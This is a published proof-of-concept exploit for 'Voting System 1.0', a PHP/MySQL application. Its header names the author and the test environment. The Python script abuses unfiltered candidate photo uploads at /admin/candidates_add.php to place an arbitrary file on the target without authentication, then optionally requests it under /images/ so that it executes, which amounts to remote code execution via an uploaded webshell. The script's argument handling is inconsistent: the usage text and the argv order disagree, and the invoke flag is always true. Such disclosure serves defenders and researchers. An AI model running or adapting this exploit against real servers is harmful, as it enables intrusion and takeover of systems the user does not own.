# Exploit Title: Voting System 1.0 - Arbitrary File Upload (Unauthenticated)
# Date: 11/06/2021
# Exploit Author: CaptainWoof (@realCaptainWoof)
# Vendor Homepage: https://www.sourcecodester.com/php/12306/voting-system-using-php.html
# Software Link: https://www.sourcecodester.com/download-code?nid=12306&title=Voting+System+using+PHP%2FMySQLi+with+Source+Code
# Version: 1.0
# Tested on: Debian 5.10.28-1kali1 (2021-04-12) x86_64 GNU/Linux // PHP Version 7.3.27

# No filetype filtering on candidate image upload results in an unauthenticated arbitrary file upload vulnerability.
# The uploaded file is present in /images/FILENAME, also accessible without authentication. 

#!/usr/bin/python3

import requests
from random import choice
from string import ascii_lowercase
from sys import argv

# Function to get random string
def getRandomString():
    s = ""
    for _ in range(10):
        s += choice(ascii_lowercase)
    return s

# MAIN CODE

# Parse args
if len(argv) < 3:
    print("Usage: {} <target_homepage> <file_to_upload> <uploaded_filename> <need_to_invoke(True|False)>".format(argv[0]))
    exit()
base_url = argv[1].rstrip("/")
filename_on_server = argv[2]
file_to_upload = argv[3]
need_to_invoke = bool(argv[4])

# Prepare the upload
file_multipart = {"photo":(filename_on_server,open(file_to_upload,'rb'))}
candidate_info = {"position":getRandomString(),"firstname":getRandomString(),"lastname":getRandomString(),"platform":getRandomString(),"add":""}

# Upload the file
print("Uploading '{}' under '{}' on target server".format(file_to_upload,filename_on_server))
candidate_add_url = base_url + "/admin/candidates_add.php"
resp = requests.post(url=candidate_add_url,data=candidate_info,files=file_multipart,allow_redirects=True)
uploaded_file_url = base_url + "/images/" + filename_on_server
print("Uploaded at: {}".format(uploaded_file_url))

# Invoke the uploaded file
if need_to_invoke:
    print("Invoking '{}'".format(filename_on_server))    
    try:
        requests.get(url = uploaded_file_url,timeout=5)
        print("Request sent!")
    except requests.exceptions.Timeout:
        print("Timed out while waiting for response")